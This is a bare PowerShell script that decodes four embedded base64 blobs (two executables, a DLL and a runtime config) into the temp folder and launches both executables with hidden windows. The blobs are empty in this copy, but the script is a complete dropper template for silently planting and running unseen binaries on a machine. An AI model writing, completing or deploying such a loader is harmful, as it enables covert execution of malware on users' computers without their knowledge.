$base64_a_exe = ""
$base64_b_exe = ""
$base64_dll   = ""
$base64_json  = ""
$tempPath = [System.IO.Path]::GetTempPath()
$aExePath = Join-Path $tempPath "a.exe"
$bExePath = Join-Path $tempPath "b.exe"
$dllPath  = Join-Path $tempPath "ConsoleApp1.dll"
$jsonPath = Join-Path $tempPath "ConsoleApp1.runtimeconfig.json"
[System.IO.File]::WriteAllBytes($aExePath, [System.Convert]::FromBase64String($base64_a_exe))
[System.IO.File]::WriteAllBytes($bExePath, [System.Convert]::FromBase64String($base64_b_exe))
[System.IO.File]::WriteAllBytes($dllPath,  [System.Convert]::FromBase64String($base64_dll))
[System.IO.File]::WriteAllBytes($jsonPath, [System.Convert]::FromBase64String($base64_json))
Start-Process -FilePath $aExePath -WorkingDirectory $tempPath -WindowStyle Hidden
Start-Process -FilePath $bExePath -WorkingDirectory $tempPath -WindowStyle Hidden